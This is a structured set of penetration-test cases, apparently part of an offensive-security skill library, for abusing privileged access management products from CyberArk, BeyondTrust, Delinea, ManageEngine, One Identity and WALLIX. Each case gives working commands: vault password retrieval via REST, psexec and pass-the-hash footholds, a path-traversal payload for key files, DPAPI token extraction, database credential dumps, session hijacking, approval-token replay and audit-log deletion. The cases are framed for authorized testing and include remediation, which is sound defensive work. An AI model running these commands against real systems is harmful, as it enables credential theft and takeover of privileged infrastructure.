# Privileged Access Management (PAM) Privilege Attack Test Cases

> This file is a companion to `SKILL.md`, providing structured test case templates for PAM vendor abuse scenarios.
> Purpose: Check each item during penetration testing to ensure no critical PAM attack path is missed. Each case includes prerequisites, steps, expected results, severity level, and remediation.
> All tests are intended solely for **authorized security assessments** with a signed statement of work.

---

## Test Case Format

```
TC-PMXXX | [Category] Test Name
Severity: CRITICAL / HIGH / MEDIUM / LOW
Prerequisites: Conditions that must be met before testing
Test Steps: Specific operations
Expected Results: Observable behavior when the vulnerability exists
Remediation: Recommended defensive actions
Pass Criteria: How to verify the test succeeded
Reference Payload: Corresponding section in payloads.md
```

---

## Index

- [A. PAM Presence and Reconnaissance](#a-pam-presence-and-reconnaissance)
- [B. CyberArk-Specific Abuse](#b-cyberark-specific-abuse)
- [C. BeyondTrust-Specific Abuse](#c-beyondtrust-specific-abuse)
- [D. Delinea-Specific Abuse](#d-delinea-specific-abuse)
- [E. ManageEngine PMP-Specific Abuse](#e-manageengine-pmp-specific-abuse)
- [F. One Identity Safeguard-Specific Abuse](#f-one-identity-safeguard-specific-abuse)
- [G. Other PAM Vendors (WALLIX / Devolutions / Xton)](#g-other-pam-vendors-wallix--devolutions--xton)
- [H. Cross-Cutting and Ransomware-Operator Playbook](#h-cross-cutting-and-ransomware-operator-playbook)

---

## A. PAM Presence and Reconnaissance

### TC-PM001 | PAM Product Identification via URL Patterns

- **Severity**: MEDIUM
- **Objective**: Identify which PAM product(s) the target organisation runs by fingerprinting URL patterns, HTTP headers, favicon hashes, and DNS naming conventions. This determines which vendor-specific attack paths to pursue.
- **Prerequisites**:
  - Network access to the target's exposed web interfaces
  - Kali Linux with `curl`, `nmap`, and `python3`
  - Authorisation to perform unauthenticated HTTP probing of the target's PAM interfaces
- **Test Steps**:
  1. Probe known PAM URL patterns: `curl -sk -I https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/`, `curl -sk -I https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/`, `curl -sk -I https://REPLACE_WITH_YOUR_PRA_HOST/login.aspx`, `curl -sk -I http://REPLACE_WITH_YOUR_PMP_HOST:7272/`, `curl -sk -I https://REPLACE_WITH_YOUR_SG_HOST/sps/`, `curl -sk -I https://REPLACE_WITH_YOUR_WAB_HOST/wab/`
  2. Compute favicon hashes for the discovered endpoints (Section 1 of payloads.md)
  3. DNS-enumerate `vault.`, `pam.`, `cyberark.`, `beyondtrust.`, `pmp-`, `safeguard-`, `bastion.` subdomains
  4. Nmap service discovery on common PAM ports: `nmap -sV -p 80,443,1858,3389,7272,7273,8081,8443,9443 REPLACE_WITH_YOUR_TARGET_RANGE`
- **Expected Result**: At least one PAM product is identified with its version fingerprint (where exposed). The product family is confirmed (CyberArk / BeyondTrust / Delinea / ManageEngine / One Identity / WALLIX / Devolutions / Xton).
- **Remediation**: Restrict management interface exposure to internal networks only, deploy a WAF that obscures version fingerprints, restrict DNS zone transfers, and monitor HTTP probes against PAM URLs.
- **Pass Criteria**: Test passes when the PAM product, version (if exposed), and at least one management URL are documented. Failure modes: product behind a reverse proxy that strips the URL pattern (use favicon hash instead); product requires authenticated access for any HTTP response (use DNS recon and DNS naming conventions).
- **Reference**: payloads.md Section 1 -- Cross-Vendor Recon and Fingerprinting

---

### TC-PM002 | PAM Authentication Surface Enumeration

- **Severity**: MEDIUM
- **Objective**: Enumerate every authentication path (form-based, SAML, OAuth, RADIUS-backed, LDAP-backed) and verify the MFA enforcement on each.
- **Prerequisites**:
  - Identified PAM product from TC-PM001
  - A valid low-privilege credential OR an unauthenticated engagement scope
  - Network access to the PAM web interfaces
- **Test Steps**:
  1. Map the login endpoints per vendor (CyberArk `/api/auth/Cyberark/Logon`, `/api/auth/LDAP/Logon`, `/api/auth/RADIUS/Logon`, `/api/auth/SAML/Logon`; BeyondTrust `/api/oauth2/token`, `/login.aspx`; Delinea `/SecretServer/oauth2/token`; ManageEngine `/api/json/admin/getkey`; Safeguard `/spp/api/v3/AuthenticationUser`)
  2. Test each endpoint with a deliberately invalid credential to confirm reachability and lockout policy
  3. Identify the MFA enforcement (CyberArk Risk-Based MFA, BeyondTrust 2FA, PMP TFA, Safeguard smart card)
  4. Check for CVE-specific bypass conditions (CVE-2025-32564 for CyberArk PVWA, CVE-2022-2451 for BeyondTrust PRA, CVE-2022-28226 for ManageEngine PMP)
- **Expected Result**: A complete map of every authentication path with MFA enforcement documented. Weak or no MFA on at least one path is a finding.
- **Remediation**: Enforce MFA on every authentication path, restrict the use of password-grant OAuth (move to authorization code + PKCE), and apply vendor security advisories.
- **Pass Criteria**: Test passes when every authentication path is enumerated and the MFA enforcement per path is documented. At least one path must be confirmed as reachable (returns a structured response to a credential probe).
- **Reference**: payloads.md Sections 2, 11, 16, 22, 19

---

## B. CyberArk-Specific Abuse

### TC-PM003 | CyberArk PVWA Authentication and Token Acquisition

- **Severity**: HIGH
- **Objective**: Acquire an authenticated CyberArk PVWA bearer token using harvested credentials and validate the session scope (read-only, auditor, Enterprise Admin).
- **Prerequisites**:
  - CyberArk PVWA URL identified (TC-PM001)
  - Valid low-privilege CyberArk or LDAP credential (from `secret-management-attack` or `phishing-attack`)
  - Network access to the PVWA on TCP/443
- **Test Steps**:
  1. Acquire a token: `TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' -d '{"username":"REPLACE_WITH_YOUR_VAULT_USER","password":"REPLACE_WITH_YOUR_VAULT_PASS"}' https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/Cyberark/Logon | jq -r .token)`
  2. Validate the session: `curl -sk -H "Authorization: Bearer $TOKEN" https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Session/Verify`
  3. Determine the user's effective permissions via `/api/UserDetails`
  4. Test refresh: `curl -sk -X POST -H "Authorization: Bearer $TOKEN" https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Session/Refresh`
- **Expected Result**: A bearer token is acquired and the session is validated. The effective permissions are documented (read-only vault user, safe owner, auditor, Enterprise Admin).
- **Remediation**: Apply least privilege to all CyberArk accounts, enforce Risk-Based MFA on logon, monitor the ITAudit Logon event for anomalies.
- **Pass Criteria**: Test passes when the token is acquired, the session is verified, and the effective permissions are documented. Failure modes: account locked (lockout policy triggered), MFA challenge issued (need MFA bypass), RADIUS challenge (need OTP).
- **Reference**: payloads.md Section 2 -- CyberArk PVWA Authentication

---

### TC-PM004 | CyberArk Safe and Account Enumeration

- **Severity**: HIGH
- **Objective**: Enumerate every safe and every account the authenticated identity can reach, mapping the credential-to-target-host relationships for downstream pivoting.
- **Prerequisites**:
  - Authenticated PVWA token from TC-PM003
  - Authorisation to enumerate the safe list (this is a high-signal action)
- **Test Steps**:
  1. Page through every safe: `curl -sk -H "Authorization: Bearer $TOKEN" 'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes?limit=100' | jq '.Safes[]'`
  2. For each safe, enumerate accounts: `curl -sk -H "Authorization: Bearer $TOKEN" "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=safename eq ${SAFE}&limit=100"`
  3. Map each account's `address` field to the target host
  4. Cross-reference with BloodHound topology to identify which accounts unlock high-value paths
- **Expected Result**: A complete map of safes, accounts, target hosts, and platform types. At least one safe contains a Tier-0 credential (Domain Admin, Enterprise Admin, krbtgt).
- **Remediation**: Restrict `List Safes` permissions to authenticated EPV users only, monitor ITAudit Event 300 for enumeration bursts, enforce tiering so Tier-0 safes are isolated.
- **Pass Criteria**: Test passes when the safe list is enumerated AND each safe has its accounts documented. Verification includes confirming that the `address` field of each account points to a real, reachable host in the engagement scope.
- **Reference**: payloads.md Section 3 -- CyberArk Safe and Account Enumeration

---

### TC-PM005 | CyberArk Credential Retrieval

- **Severity**: CRITICAL
- **Objective**: Retrieve the actual password value of a high-value credential from a CyberArk safe via the REST API and verify it against the target.
- **Prerequisites**:
  - Authenticated PVWA token with `Retrieve` permission on the target safe
  - Identified high-value account from TC-PM004
  - Authorisation to retrieve production credentials (this is the highest-impact action of the engagement)
- **Test Steps**:
  1. Retrieve the password: `PASS=$(curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"reason":"incident-response","TicketingSystemName":"jira","TicketId":"INC-1234","Action":"reveal"}' "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/Password/Retrieve" | jq -r .password)`
  2. Verify against the target: `ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\\$USER" -w "$PASS" -s sub -b "" namingcontexts`
  3. Convert to a foothold: `impacket-psexec "$DOMAIN/$USER:$PASS@$DC_IP"`
  4. Document the audit trail: confirm the retrieval is logged in ITAudit with the supplied `reason` and `TicketId`
- **Expected Result**: The plaintext password is retrieved. The credential authenticates to the target. A foothold is established via `psexec` / `wmiexec` / `ssh`. The ITAudit log contains the retrieval entry.
- **Remediation**: Enforce dual control on Tier-0 safes, monitor ITAudit Event 303 (Get Password) for anomalous patterns, enforce ticket validation against an external ITSM, rotate the credential on detection.
- **Pass Criteria**: Test passes when (a) the password is retrieved, (b) it authenticates to the target, (c) the foothold is established. Failure modes: dual control required (need an approver), JIT checked-out (wait or replay approval token), credential just rotated (try the previous value if available).
- **Reference**: payloads.md Section 4 -- CyberArk Credential Retrieval

---

### TC-PM006 | CyberArk CVE-2025-32564 Area Authentication Bypass

- **Severity**: CRITICAL
- **Objective**: Where the CyberArk PVWA is within the affected version range for CVE-2025-32564-class authentication bypass, demonstrate unauthenticated access to the safe list and credential retrieval.
- **Prerequisites**:
  - Identified PVWA running an affected version (verify via `/PasswordVault/api/build`)
  - The bypass condition applies (per the CyberArk Security Advisory)
  - Authorisation to test unauthenticated exploitation
- **Test Steps**:
  1. Confirm the version: `curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/build | jq -r .version`
  2. Send the crafted request per the published PoC pattern (Section 10 of payloads.md)
  3. Validate the response: if the safe list is returned, the bypass succeeded
  4. Compare against an unauthenticated baseline (`curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes | head -3`) to confirm
- **Expected Result**: The bypass succeeds -- unauthenticated access to the safe list (and possibly credential retrieval) is granted.
- **Remediation**: Apply the CyberArk security advisory patch, restrict PVWA exposure to authenticated users only at the network layer (WAF / reverse proxy), monitor ITAudit for unauthenticated access attempts.
- **Pass Criteria**: Test passes when the bypass returns a safe list without authentication. If the bypass does not apply (patched, version out of range, configuration not matching), document the negative result and move on.
- **Reference**: payloads.md Section 10 -- CyberArk CVE-2025-32564 Area Auth Bypass

---

### TC-PM007 | CyberArk Credential File (.cue) Theft and Decryption

- **Severity**: CRITICAL
- **Objective**: From a foothold on an AIM/CCP provider host, recover `.cue` credential cache files, decrypt them with the recovered master key, and extract plaintext credentials.
- **Prerequisites**:
  - Local admin / root on an AIM/CCP provider host
  - Ability to read `/opt/CARKaim/` or `C:\Program Files (x86)\CyberArk\AIMProvider\cache\`
  - Either the operator key from `/opt/CARKvault/operator-keys/` OR the recovered master key
- **Test Steps**:
  1. Locate `.cue` files: `find / -name '*.cue' 2>/dev/null`
  2. Recover the operator key from `paragent.xml` and the operator-keys directory (Section 9 of payloads.md)
  3. Decrypt a `.cue` file with the recovered key (Section 7)
  4. Verify the recovered plaintext credential against the target
- **Expected Result**: At least one `.cue` file is recovered and decrypted. The plaintext credential authenticates to its target.
- **Remediation**: Remove the credential cache from the AIM/CCP provider host, restrict filesystem permissions on `paragent.xml` and `operator-keys/`, enforce HSM-backed key storage, monitor Vault Audit for `GetFile` events.
- **Pass Criteria**: Test passes when (a) `.cue` files are located, (b) the decryption succeeds, (c) the plaintext credential authenticates. Failure modes: master key not recoverable (operator keys distributed across unavailable hosts), `.cue` files rotated before decryption (re-acquire).
- **Reference**: payloads.md Sections 7 and 9 -- `.cue` Theft and Master Key Escrow

---

### TC-PM008 | CyberArk PSM Session Discovery and Hijacking

- **Severity**: HIGH
- **Objective**: Identify active PSM sessions, retrieve session metadata, and demonstrate session hijacking via shadow RDP from a foothold on the PSM server.
- **Prerequisites**:
  - Authenticated PVWA token with auditor or admin permission
  - Local admin on at least one PSM server (for the shadow RDP step)
- **Test Steps**:
  1. List active PSM sessions: `curl -sk -H "Authorization: Bearer $TOKEN" 'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Sessions?limit=100'`
  2. Identify a high-value active session (Domain Admin logged in)
  3. On the PSM server, identify the session ID: `query user`
  4. Shadow the session: `mstsc /shadow:<id> /v:localhost /control`
- **Expected Result**: An active PSM session is identified. Shadowing succeeds -- the attacker observes and can interact with the privileged session.
- **Remediation**: Restrict local admin on the PSM pool, enforce PSM recording tamper-evidence, monitor ITAudit Event 410 (PSM Shadow) as a high-signal alert, deploy PSM hardening per CyberArk documentation.
- **Pass Criteria**: Test passes when (a) an active session is listed, (b) the shadow RDP succeeds. Failure modes: PSM recording tamper-evidence blocks shadow, EDR detects the shadow command, the target session ended before shadowing.
- **Reference**: payloads.md Section 6 -- CyberArk PSM Session Discovery

---

## C. BeyondTrust-Specific Abuse

### TC-PM009 | BeyondTrust CVE-2022-2451 SAML Account Injection

- **Severity**: CRITICAL
- **Objective**: Where the BeyondTrust PRA / Password Safe / Identity Security Insights is within the CVE-2022-2451 affected version range, demonstrate SAML account injection to obtain unauthorised privileged remote access.
- **Prerequisites**:
  - BeyondTrust PRA appliance identified (TC-PM001)
  - The PRA uses SAML authentication (verify via the `/login.aspx` page or `/api/saml/metadata`)
  - The PRA version is within the BTN-2022-04 affected range (verify via `/api/v1/system/version`)
- **Test Steps**:
  1. Pull the SAML metadata to understand the expected issuer and audience: `curl -sk https://REPLACE_WITH_YOUR_PRA_HOST/api/saml/metadata`
  2. Craft a SAML response with an attacker-supplied NameID (Section 13 of payloads.md)
  3. Submit the SAML response to the PRA consumer endpoint
  4. Validate that the resulting session cookie grants access to an administrative user
  5. Demonstrate impact: enumerate users, retrieve a credential
- **Expected Result**: The SAML injection succeeds -- the attacker is authenticated as an administrative user without a valid IdP-issued assertion.
- **Remediation**: Apply the BTN-2022-04 patch, restrict the SAML IdP to known IdPs only (signed assertions required), monitor BeyondTrust Appliance Audit for SAML logons from unusual IdPs.
- **Pass Criteria**: Test passes when the SAML injection returns a valid session cookie AND the session grants administrative access. If the patch is applied, document the negative result.
- **Reference**: payloads.md Section 13 -- BeyondTrust CVE-2022-2451 SAML Account Injection

---

### TC-PM010 | BeyondTrust Session Recording Tampering

- **Severity**: HIGH
- **Objective**: Demonstrate that an attacker with admin API scope can download, modify, or delete a session recording, and verify whether the tamper-evidence control detects the modification.
- **Prerequisites**:
  - Authenticated BeyondTrust API token with admin scope
  - At least one completed session recording
- **Test Steps**:
  1. List recordings: `curl -sk -H "Authorization: Bearer $BT_TOKEN" https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings`
  2. Download a recording: `curl -sk -H "Authorization: Bearer $BT_TOKEN" "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}/video" -o session.btvideo`
  3. Verify the HMAC: `curl -sk -H "Authorization: Bearer $BT_TOKEN" "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}/verify"`
  4. Attempt to delete the recording: `curl -sk -X DELETE -H "Authorization: Bearer $BT_TOKEN" "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}"`
  5. Verify the deletion is logged in the audit
- **Expected Result**: The recording can be downloaded and deleted. If tamper-evidence is enabled, the HMAC verification flags any modification.
- **Remediation**: Enable tamper-evidence on all session recordings, stream recording metadata to an external SIEM in real time (so deletion on the appliance does not erase the record), restrict admin API scope to a small group.
- **Pass Criteria**: Test passes when (a) the recording is downloaded, (b) the HMAC verification works (if enabled), (c) the deletion is logged. The test should highlight whether tamper-evidence is enabled by default.
- **Reference**: payloads.md Section 14 -- BeyondTrust Session Recording Tampering

---

## D. Delinea-Specific Abuse

### TC-PM011 | Delinea Secret Server OAuth Token Theft via DPAPI

- **Severity**: CRITICAL
- **Objective**: From a foothold on a host running the Secret Server distributed engine, extract the DPAPI-protected OAuth refresh token from the agent config and use it to authenticate to the Secret Server API.
- **Prerequisites**:
  - Local admin on a host running the Delinea distributed engine
  - `SharpDPAPI` or `mimikatz` available on the Windows foothold
  - Network access to the Secret Server from the foothold
- **Test Steps**:
  1. Locate the agent config: `Get-ChildItem 'C:\Program Files\Thycotic\Distributed Engine\' -Recurse -Filter '*.config'`
  2. Extract the DPAPI blob: `SharpDPAPI.exe blobs /target:'DistributedEngine.exe.config'`
  3. Recover the OAuth refresh token from the decrypted blob
  4. Use the refresh token: `curl -sk -X POST -d 'grant_type=refresh_token&refresh_token=...&client_id=...' https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/oauth2/token`
  5. Validate the resulting access token by listing secrets: `curl -sk -H "Authorization: Bearer $TOKEN" https://REPLACE_WITH_YOUR_SS_HOST/api/v1/secrets`
- **Expected Result**: The DPAPI blob is decrypted. The OAuth refresh token is recovered. The resulting access token authenticates to the Secret Server API.
- **Remediation**: Migrate to distributed engine authentication that does not persist a refresh token locally (use machine identity + signed assertions), restrict DPAPI access to specific service accounts, monitor the Secret Server Event Framework for `RefreshTokenUsed` events from new IPs.
- **Pass Criteria**: Test passes when (a) the DPAPI blob is decrypted, (b) the refresh token is valid, (c) the access token grants API access. Failure modes: DPAPI protected under a different user context (need to dump that user's master key), refresh token expired (try the previous one if cached).
- **Reference**: payloads.md Section 17 -- Delinea Local Agent Config (DPAPI) Extraction

---

## E. ManageEngine PMP-Specific Abuse

### TC-PM012 | ManageEngine PMP PostgreSQL Backend Extraction

- **Severity**: CRITICAL
- **Objective**: From a foothold on the ManageEngine PMP server, dump the embedded PostgreSQL backend, recover the AES-encrypted credential table, and decrypt it using the PMP master key.
- **Prerequisites**:
  - Local admin / root on the PMP server
  - Ability to read `/opt/ManageEngine/PMP/pgsql/` and `/opt/ManageEngine/PMP/conf/pmp_key.key`
- **Test Steps**:
  1. Locate the embedded PostgreSQL: `find /opt/ManageEngine -name 'postgresql.conf'`
  2. Identify the port and credentials from `server.xml` and `pmp_key.key`
  3. Connect via local socket: `sudo -u postgres psql -p 2345 -d PassTrix`
  4. Dump the credential table: `SELECT resource_id, account_id, password_blob FROM passwd;`
  5. Decrypt each blob with the master key (Section 24 of payloads.md)
- **Expected Result**: The credential table is dumped and every password blob is decrypted to plaintext.
- **Remediation**: Restrict local admin on the PMP server, encrypt the PostgreSQL backend at rest, rotate the PMP master key annually, monitor for direct PostgreSQL access from non-PMP processes.
- **Pass Criteria**: Test passes when (a) PostgreSQL access succeeds, (b) the credential table is dumped, (c) at least one credential is decrypted to plaintext. Verification: the decrypted plaintext authenticates to its target.
- **Reference**: payloads.md Section 24 -- ManageEngine PMP PostgreSQL Backend Extraction

---

### TC-PM013 | ManageEngine CVE-2022-28226 Area Path Traversal

- **Severity**: HIGH
- **Objective**: Where the ManageEngine PMP is within the CVE-2022-28226 affected version range, demonstrate pre-auth path traversal to disclose sensitive files (including `pmp_key.key`).
- **Prerequisites**:
  - ManageEngine PMP identified (TC-PM001)
  - PMP version within the CVE-2022-28226 affected range
- **Test Steps**:
  1. Identify the PMP version: `curl -sk https://REPLACE_WITH_YOUR_PMP_HOST:7272/ | grep -i 'version\|build'`
  2. Send the path traversal payload: `curl -sk --path-as-is 'https://REPLACE_WITH_YOUR_PMP_HOST:7272/..%2f..%2f..%2f..%2fetc/passwd'`
  3. If successful, use the traversal to read `pmp_key.key`: `curl -sk --path-as-is 'https://REPLACE_WITH_YOUR_PMP_HOST:7272/..%2f..%2f..%2fconf/pmp_key.key' -o pmp_key.key`
  4. Chain with TC-PM012 to decrypt the credential table offline
- **Expected Result**: The traversal discloses files outside the web root. The `pmp_key.key` is recoverable, enabling offline decryption of the credential table.
- **Remediation**: Apply the ManageEngine patch for CVE-2022-28226, restrict unauthenticated API access, deploy a WAF that detects path traversal patterns.
- **Pass Criteria**: Test passes when the traversal successfully discloses `/etc/passwd` (or equivalent) AND the `pmp_key.key` is recoverable. If patched, document the negative result.
- **Reference**: payloads.md Section 25 -- ManageEngine CVE-2022-28226 Area Abuse

---

## F. One Identity Safeguard-Specific Abuse

### TC-PM014 | One Identity Safeguard SSL Pinning Bypass

- **Severity**: MEDIUM
- **Objective**: Demonstrate that the One Identity Safeguard admin console's SSL pinning can be bypassed via Frida or a JS injection proxy, enabling MITM of the admin console API surface.
- **Prerequisites**:
  - One Identity Safeguard admin console URL identified
  - The admin console is accessible from a browser under the tester's control
  - Frida or Burp Suite + a JS injection proxy available
- **Test Steps**:
  1. Confirm SSL pinning: MITM with a custom CA via mitmproxy and observe the admin console refusing to connect
  2. Deploy the Frida bypass script (Section 20 of payloads.md)
  3. Browse to the admin console via the proxy -- confirm connection succeeds
  4. Identify unauthenticated privileged session fabric endpoints via API discovery
- **Expected Result**: The SSL pinning is bypassed. The admin console's API surface is observable via the MITM proxy.
- **Remediation**: Keep the SSL pinning implementation up to date, restrict admin console access to known management workstations, monitor for Frida-style injection (process anomalies on the admin workstation).
- **Pass Criteria**: Test passes when the Frida script enables MITM of the admin console AND at least one previously-hidden API endpoint is observed. Failure modes: pinning implemented at the OS level (need kernel-level bypass), admin console refuses connection even with bypass (next-generation pinning).
- **Reference**: payloads.md Section 20 -- One Identity SSL Pinning Bypass

---

## G. Other PAM Vendors (WALLIX / Devolutions / Xton)

### TC-PM015 | WALLIX Bastion API Enumeration and Session Recording Tampering

- **Severity**: HIGH
- **Objective**: Enumerate WALLIX Bastion users, devices, accounts, and sessions via the API, then verify whether session recording tampering is detectable.
- **Prerequisites**:
  - WALLIX Bastion URL identified (TC-PM001)
  - Valid API credentials (admin or auditor scope)
- **Test Steps**:
  1. Acquire a token: `WAB_TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' -d '{"username":"...","password":"..."}' https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/auth/login | jq -r .token)`
  2. Enumerate devices and accounts: `curl -sk -H "Authorization: Bearer $WAB_TOKEN" https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/devices`
  3. Enumerate sessions: `curl -sk -H "Authorization: Bearer $WAB_TOKEN" https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/sessions`
  4. Download a session recording: `curl -sk -H "Authorization: Bearer $WAB_TOKEN" https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/sessions/REPLACE_WITH_YOUR_SESSION_ID/recording -o session.cast`
  5. Verify tamper-evidence by checking the audit log for any deletion attempt
- **Expected Result**: All WALLIX Bastion entities are enumerated. The session recording is downloadable. Tamper-evidence (if enabled) is documented.
- **Remediation**: Restrict API access to specific management networks, enable tamper-evidence on all recordings, stream recording metadata to an external SIEM.
- **Pass Criteria**: Test passes when (a) devices, accounts, and sessions are enumerated, (b) a recording is downloaded, (c) the tamper-evidence control is documented (enabled / disabled). Verification: cross-reference the API enumeration with the wabadmin CLI output.
- **Reference**: payloads.md Section 26 -- WALLIX Bastion Abuse

---

## H. Cross-Cutting and Ransomware-Operator Playbook

### TC-PM016 | PAM-Aware Pass-the-Hash Within Rotation Window

- **Severity**: HIGH
- **Objective**: Demonstrate that a harvested NTLM hash of a PAM-managed account can be used via Pass-the-Hash within the rotation window before the PAM forces a password change.
- **Prerequisites**:
  - NTLM hash of a PAM-managed privileged account (harvested via `mimikatz sekurlsa::msv` from an endpoint where the account was used)
  - Knowledge of the PAM rotation schedule for the account (via the PAM API)
  - Network access to the target host that accepts the hash
- **Test Steps**:
  1. Confirm the PAM rotation schedule: `curl -sk -H "Authorization: Bearer $TOKEN" "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}" | jq '.platformAccountProperties | {AutoChange, LastChange, NextChange}'`
  2. Use the hash within the rotation window: `impacket-wmiexec -hashes :REPLACE_WITH_YOUR_NTLM_HASH REPLACE_WITH_YOUR_DOMAIN/REPLACE_WITH_YOUR_DA_NAME@REPLACE_WITH_YOUR_DC_IP`
  3. Document the time elapsed between harvest and use, and the rotation window remaining
  4. If possible, demonstrate rotation invalidating the hash: force a rotation via the PAM API and re-test the hash
- **Expected Result**: The hash authenticates within the rotation window. After PAM rotation, the hash no longer authenticates.
- **Remediation**: Reduce rotation intervals for Tier-0 accounts (hourly rather than daily), enforce the PAM-managed credential be used only via PSM/PRA (never disclosed to the endpoint), monitor for Pass-the-Hash on PAM-managed accounts.
- **Pass Criteria**: Test passes when (a) the hash authenticates within the window, (b) the rotation invalidates the hash. Failure modes: hash already invalid (rotation happened between harvest and use), endpoint enforces SMB signing (use wmiexec with `-no-pass -k`).
- **Reference**: payloads.md Section 29 -- Pass-the-Hash in PAM Contexts

---

### TC-PM017 | JIT Workflow Bypass via Stale Approval Token Replay

- **Severity**: HIGH
- **Objective**: Demonstrate that a stale JIT approval token (CyberArk "Request Object" ConfirmId) can be replayed to access an account outside the original approval window.
- **Prerequisites**:
  - Authenticated PVWA token with read access to the Requests API
  - A previously-approved JIT request that has been checked in (the ConfirmId is in the audit log)
- **Test Steps**:
  1. Recover a previously-issued ConfirmId: `curl -sk -H "Authorization: Bearer $TOKEN" 'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Requests?status=Approved' | jq -r '.value[0].ConfirmId'`
  2. Replay the ConfirmId for a new check-out: `curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "{\"ConfirmId\":\"$CONFIRM_ID\"}" "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/CheckOut"`
  3. If the replay succeeds, retrieve the credential and document the time elapsed since the original approval
  4. Verify whether the PAM enforces single-use ConfirmIds (replay should fail)
- **Expected Result**: Either the replay succeeds (vulnerability confirmed) or fails (the PAM correctly enforces single-use ConfirmIds).
- **Remediation**: Enforce single-use ConfirmIds (CyberArk configuration `UseOneTimeConfirmId=true`), enforce a strict TTL on approved requests, monitor ITAudit Event 308 (Check Out Account) for replays.
- **Pass Criteria**: Test passes when the replay succeeds OR the PAM correctly rejects the replay (document the negative result with the rejection reason). The test should highlight whether the JIT workflow is correctly bound to time and use.
- **Reference**: payloads.md Section 31 -- JIT Workflow Bypass

---

### TC-PM018 | Ransomware Operator PAM Playbook Replay (Purple Team)

- **Severity**: CRITICAL
- **Objective**: In a defensive engagement, replay the documented BlackCat / ALPHV PAM-targeting playbook and measure detection coverage at each step.
- **Prerequisites**:
  - A test PAM environment (CyberArk or BeyondTrust) populated with sample credentials
  - Detection coverage (SIEM, EDR) configured per the recommended telemetry
  - Authorisation to simulate the ransomware operator playbook
- **Test Steps**:
  1. Phase 1: Internal recon -- identify PAM infrastructure via nmap and DNS
  2. Phase 2: PAM enumeration -- attempt default credential list against the PVWA/PRA
  3. Phase 3: Mass credential retrieval -- retrieve every credential the test token can reach (Section 33 of payloads.md)
  4. Phase 4: Simultaneous credential use across the test estate
  5. Phase 5: Post-breach cleanup -- disable session recording, delete audit log entries
  6. At each step, measure which detection rules fired
- **Expected Result**: The detection stack should fire on the burst of `GetPassword`/`PasswordReveal` events, the session recording disable, and the audit log deletion. Gaps in detection coverage are documented.
- **Remediation**: Implement the SIEM detection rules in Section 36 of payloads.md, tune the threshold for `GetPassword` bursts per role, alert on session recording disable as a high-severity event.
- **Pass Criteria**: Test passes when (a) the playbook executes end-to-end, (b) every step is detected by at least one control, (c) the gaps in coverage are documented for SOC tuning.
- **Reference**: payloads.md Section 33 -- Ransomware Operator Playbook Replay

---

## Summary Severity Matrix

| TC ID | Title | Severity |
|-------|-------|----------|
| TC-PM001 | PAM Product Identification via URL Patterns | MEDIUM |
| TC-PM002 | PAM Authentication Surface Enumeration | MEDIUM |
| TC-PM003 | CyberArk PVWA Authentication and Token Acquisition | HIGH |
| TC-PM004 | CyberArk Safe and Account Enumeration | HIGH |
| TC-PM005 | CyberArk Credential Retrieval | CRITICAL |
| TC-PM006 | CyberArk CVE-2025-32564 Area Authentication Bypass | CRITICAL |
| TC-PM007 | CyberArk Credential File (.cue) Theft and Decryption | CRITICAL |
| TC-PM008 | CyberArk PSM Session Discovery and Hijacking | HIGH |
| TC-PM009 | BeyondTrust CVE-2022-2451 SAML Account Injection | CRITICAL |
| TC-PM010 | BeyondTrust Session Recording Tampering | HIGH |
| TC-PM011 | Delinea Secret Server OAuth Token Theft via DPAPI | CRITICAL |
| TC-PM012 | ManageEngine PMP PostgreSQL Backend Extraction | CRITICAL |
| TC-PM013 | ManageEngine CVE-2022-28226 Area Path Traversal | HIGH |
| TC-PM014 | One Identity Safeguard SSL Pinning Bypass | MEDIUM |
| TC-PM015 | WALLIX Bastion API Enumeration and Session Recording Tampering | HIGH |
| TC-PM016 | PAM-Aware Pass-the-Hash Within Rotation Window | HIGH |
| TC-PM017 | JIT Workflow Bypass via Stale Approval Token Replay | HIGH |
| TC-PM018 | Ransomware Operator PAM Playbook Replay (Purple Team) | CRITICAL |

---

## Cross-References

- `skills/secret-management-attack/test-cases.md` -- HashiCorp Vault and cloud secret-manager abuse tests
- `skills/ad-ldap-attack/test-cases.md` -- AD lateral movement tests using PAM-recovered credentials
- `skills/ad-cs-abuse/test-cases.md` -- PKI-based escalation chains
- `skills/cloud-identity-attack/test-cases.md` -- Cloud PIM/PAM tests
- `skills/digital-forensics/test-cases.md` -- PAM forensic artifacts
- `skills/pentest-reporting/test-cases.md` -- Report assembly with PAM findings
